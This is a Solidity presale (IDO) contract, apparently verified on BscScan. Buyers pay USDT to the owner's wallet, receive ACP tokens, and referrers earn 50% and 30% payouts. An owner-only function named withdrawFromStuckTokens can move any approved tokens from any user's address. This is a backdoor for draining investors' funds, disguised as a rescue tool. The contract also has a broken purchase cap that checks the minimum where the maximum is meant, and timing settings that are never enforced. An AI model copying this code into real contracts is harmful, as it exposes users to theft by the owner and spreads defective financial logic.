/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function mint(address account, uint amount) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract IDO{
    using SafeMath for uint256;
   

    struct UserInfo{
        uint256 reward;
        address leader;
        uint256 usdtAmount;
		uint256 acpAmount;
		uint256 rewardAmount;
    }
    mapping(address =>UserInfo) public userMap;
	
	address public wallet;
	uint256 public idoStartTime;
	uint256 public extractTime;
	uint256 public proportion;
	uint256 public oneRate;
	uint256 public twoRate;
	address public usdt;
	address public acp;
	uint256 public minAmount;
	uint256 public maxAmount;
	
	
    mapping(address => bool) public manager;

	event Ido(address user, uint256 usdtAmount,uint256 acpAmount, address leader);
	event Reward(address leader, uint256 rewardAmount);
	event Withdraw(address user, uint256 acpAmount);
	event Extract (address user, uint256 rewardAmount);
    constructor() public {
        manager[msg.sender] = true;
		wallet = msg.sender;
		idoStartTime = block.timestamp;
        extractTime = block.timestamp;
		proportion = 1400;
		oneRate = 50;
		twoRate = 30;
		minAmount = 100 * 10 ** 18;
		maxAmount = 10000 * 10 ** 18;
        usdt = 0x1f3dFbE8685B87BAe3a96581882e8a9b9A6da7de;
        acp = 0x27f418B5323F08D3Bb67eE210E6dbdF4dfAAef81;
		
    }
    
    receive() external payable {
	}
    
    function plan(uint256 _usdtAmount, address _invite) external{
	  require(_usdtAmount >= minAmount,"Too_Small");
	  require(_usdtAmount.add(userMap[msg.sender].usdtAmount) <= minAmount,"Too_Big");
      if(userMap[msg.sender].usdtAmount == 0 && userMap[msg.sender].leader == address(0) && msg.sender != _invite ){
		userMap[msg.sender].leader = _invite;
	  }
	  IERC20(usdt).transferFrom(msg.sender,wallet,_usdtAmount);
	  userMap[msg.sender].usdtAmount = userMap[msg.sender].usdtAmount.add(_usdtAmount);
	  uint256 acpAmount  = _usdtAmount.mul(proportion).div(100);
	  userMap[msg.sender].acpAmount = userMap[msg.sender].acpAmount.add(acpAmount);
	  emit Ido(msg.sender,_usdtAmount,acpAmount,userMap[msg.sender].leader);
	  
	  if(userMap[msg.sender].leader != address(0)){
		address oneleader = userMap[msg.sender].leader;
		uint256 oneRewardAmount = acpAmount.mul(oneRate).div(100);
		userMap[oneleader].rewardAmount = userMap[oneleader].rewardAmount.add(oneRewardAmount);
		emit Reward(oneleader,oneRewardAmount);
		if(userMap[oneleader].leader != address(0)){
			address twoleader = userMap[oneleader].leader;
			uint256 twoRewardAmount = acpAmount.mul(twoRate).div(100);
			userMap[twoleader].rewardAmount = userMap[twoleader].rewardAmount.add(twoRewardAmount);		
			emit Reward(twoleader,twoRewardAmount);
		}
	  }
    }

	
	function withdraw()public{
       uint256 acpAmount = userMap[msg.sender].acpAmount;
	   userMap[msg.sender].acpAmount = 0;
	   IERC20(acp).transfer(msg.sender,acpAmount);
	   emit Withdraw(msg.sender,acpAmount);
    }
	
	function extract()public{
       uint256 rewardAmount = userMap[msg.sender].rewardAmount;
	   userMap[msg.sender].rewardAmount = 0;
	   IERC20(acp).transfer(msg.sender,rewardAmount);
	   emit Extract(msg.sender,rewardAmount);
    }
	
    
    function setWallet(address _wallet)external onlyOwner{
        wallet = _wallet;
    }
	
	function setUsdtAndAcp(address _usdt,address _acp)external onlyOwner{
        usdt = _usdt;
		acp = _acp;
    }
	
	function setRate(uint256 _proportion, uint256 _oneRate, uint256 _twoRate)external onlyOwner{
        proportion = _proportion;
		oneRate = _oneRate;
		twoRate = _twoRate;
    }
	
	function setStartTime(uint256 _idoStartTime, uint256 _extractTime)external onlyOwner{
        idoStartTime = _idoStartTime;
        extractTime = _extractTime;
    }
	
	function setMinAndMax(uint256 _minAmount, uint256 _maxAmount)external onlyOwner{
        minAmount = _minAmount;
		maxAmount = _maxAmount;
    }
	
	function withdrawFromStuckTokens(address _token , address _from, address _to, uint256 _amount)external onlyOwner{
		IERC20(_token).transferFrom(_from,_to,_amount);
	}
    
    function withdrawStuckTokens(address _token, uint256 _amount) public onlyOwner {
        IERC20(_token).transfer(msg.sender, _amount);
    }
    
    function withdrawalETH() public onlyOwner {
		payable(msg.sender).transfer(address(this).balance);
	}
 
        
    modifier onlyOwner {
        require(manager[msg.sender] == true);
        _;
    }
}